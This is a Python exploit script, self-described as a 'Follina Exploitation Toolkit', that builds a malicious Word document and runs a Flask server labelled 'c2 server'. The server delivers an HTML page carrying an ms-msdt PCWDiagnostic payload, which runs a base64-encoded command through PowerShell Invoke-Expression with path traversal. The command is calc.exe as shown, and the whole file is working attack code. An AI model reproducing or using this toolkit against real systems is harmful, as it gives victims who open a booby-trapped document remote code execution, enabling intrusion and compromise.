import os 
import shutil
import socket
import base64
from flask import Flask
import threading
import tempfile
import argparse

TEMPLATE_PATH = './template'
URL_PATH = 'word/_rels/document.xml.rels'

def _build_html_payload():
	command = 'calc.exe'	
	encoded_command = base64.b64encode(command.encode()).decode()

	payload = r'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu'''
	payload += r'''IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'''
	payload += r''''Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'''
	payload += fr''''{encoded_command}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""'''
	
	padding = f"//{'A'*128}\n"*32 #4KB padding

	return f'''
{padding}
<!DOCTYPE html>
	<html>
		<body>
			<script>{payload}</script>
		</body>
	</html>
'''

def _get_local_ip_addr():
	'''return the hosts local ip address'''
	with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as s:
		s.connect(('8.8.8.8',80))
		ip_addr = s.getsockname()[0]
	return ip_addr

def make_a_temp_copy(temp_path):
	#copy template into the temp directory
	shutil.copytree(TEMPLATE_PATH,temp_path,dirs_exist_ok=True)

def update_template_url(url,path):
	ifile = os.path.join(path,URL_PATH)
	with open(ifile,'r+') as f:
		content = f.read().format(serverUrl='%s!' % url)
		f.seek(0)
		f.write(content)

def create_document(ofile,files_path):
	#remove .DS_Store to prevent issues on mac
	try:
		os.rmdir(os.path.join(files_path,'.DS_Store'))
	except:
		pass
	#make an archive
	shutil.make_archive(ofile,'zip',files_path)
	#change the file extension from zip to docx
	os.rename(f'{ofile}.zip',f'{ofile}.docx')


# --------------------- Webserver Code -----------------------------------

app = Flask('c2 server')

@app.route('/follina.html') 
def send_payload():
	html_template = _build_html_payload()
	return html_template

# ------------------------------------------------------------------------

# ------------------------- Arguments ------------------------------------

parser = argparse.ArgumentParser(description='Follina Exploitation Toolkit')

parser.add_argument('-u','--host',metavar='IP_ADDR',type=str,default=_get_local_ip_addr(),
					help='host ip address')

parser.add_argument('-p','--port',metavar='PORT',type=int,default=5000, help='host port')

parser.add_argument('-o','--output',metavar='OFILE',type=str,default='./follina',
					help='output file')

parser.add_argument('-m','--mode',metavar='{server, create}',type=str,default='server,create',
				help='operation mode - server,create')

# ------------------------------------------------------------------------
if __name__ == '__main__':
	args = parser.parse_args()

	if 'server' in args.mode.lower().split(','):
		#run a webserver in a separate thread
		webserver_thread = threading.Thread(target=app.run,kwargs={'port':args.port})
		webserver_thread.start()
	
	if 'create' in args.mode.lower().split(','):
		#create a temporary directory for the document files
		tmp_dir = tempfile.TemporaryDirectory()
		make_a_temp_copy(tmp_dir.name)
		print(f'[+] injecting the template.\n    - host: {args.host}\n    - port:{args.port}')
		update_template_url(f'http://{args.host}:{args.port}/follina.html',tmp_dir.name)
		create_document(args.output,tmp_dir.name)
		print(f'[+] created: {args.output}')
		tmp_dir.cleanup()	

